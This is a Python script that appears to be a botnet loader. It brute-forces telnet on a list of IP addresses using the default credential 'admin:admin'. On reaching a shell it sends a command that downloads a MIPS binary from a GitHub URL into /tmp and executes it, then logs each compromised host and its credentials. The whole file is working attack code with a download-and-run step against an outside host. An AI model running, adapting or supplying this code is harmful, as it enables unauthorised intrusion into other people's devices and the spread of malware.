import threading
import sys, os, re, time, socket
from queue import Queue
from sys import stdout

# Ensure correct usage of the script
if len(sys.argv) < 4:
    print("Usage: python3 " + sys.argv[0] + " <list> <threads> <output file>")
    sys.exit()

# Credentials for brute-forcing
combo = ["admin:admin"]

# Read IP addresses from the input file
ips = open(sys.argv[1], "r").readlines()
threads = int(sys.argv[2])
output_file = sys.argv[3]
queue = Queue()
queue_count = 0

# Add IPs to the queue
for ip in ips:
    queue_count += 1
    stdout.write("\r[%d] Added to queue" % queue_count)
    stdout.flush()
    queue.put(ip.strip())  # Ensure no extra newlines
print("\n")

class router(threading.Thread):
    def __init__(self, ip):
        threading.Thread.__init__(self)
        self.ip = str(ip).rstrip('\n')
        self.rekdevice = "cd /tmp; wget https://raw.githubusercontent.com/20Matrix77/jdifjshfirej/refs/heads/main/mips; busybox wget https://raw.githubusercontent.com/20Matrix77/jdifjshfirej/refs/heads/main/mips; chmod 777 mips; ./mips"

    def run(self):
        global fh
        username = ""
        password = ""
        for passwd in combo:
            if ":n/a" in passwd:
                password = ""
            else:
                password = passwd.split(":")[1]
            if "n/a:" in passwd:
                username = ""
            else:
                username = passwd.split(":")[0]
            
            try:
                tn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                tn.settimeout(0.37)
                tn.connect((self.ip, 23))
            except Exception:
                tn.close()
                break
            
            try:
                hoho = ''
                hoho += readUntil(tn, ":")
                if ":" in hoho:
                    tn.send((username + "\r\n").encode())
                    time.sleep(0.1)
            except Exception:
                tn.close()

            try:
                hoho = ''
                hoho += readUntil(tn, ":")
                if ":" in hoho:
                    tn.send((password + "\r\n").encode())
                    time.sleep(0.1)
                else:
                    pass
            except Exception:
                tn.close()

            try:
                prompt = tn.recv(40960).decode('utf-8', 'ignore')
                success = False
                if "#" in prompt or "$" in prompt:
                    success = True
                else:
                    tn.close()

                if success:
                    try:
                        tn.send((self.rekdevice + "\r\n").encode())
                        fh.write(self.ip + ":23 " + username + ":" + password + "\n")
                        fh.flush()
                        print(f"[+] GOTCHA -> {username}:{password}:{self.ip}")
                        tn.close()
                        break
                    except:
                        tn.close()
                else:
                    tn.close()
            except Exception:
                tn.close()

# Helper function to read until a certain string is received
def readUntil(tn, string, timeout=6):
    buf = ''
    start_time = time.time()
    while time.time() - start_time < timeout:
        buf += tn.recv(1024).decode('utf-8', 'ignore')
        time.sleep(0.01)
        if string in buf: 
            return buf
    raise Exception('TIMEOUT!')

# Worker function to handle multiple threads
def worker():
    try:
        while True:
            try:
                IP = queue.get()
                thread = router(IP)
                thread.start()
                queue.task_done()
                time.sleep(0.02)
            except:
                pass
    except:
        pass

# Open the output file for writing
global fh
fh = open("workingtelnet.txt", "a")

# Start the worker threads
for _ in range(threads):
    try:
        t = threading.Thread(target=worker)
        t.start()
    except:
        pass
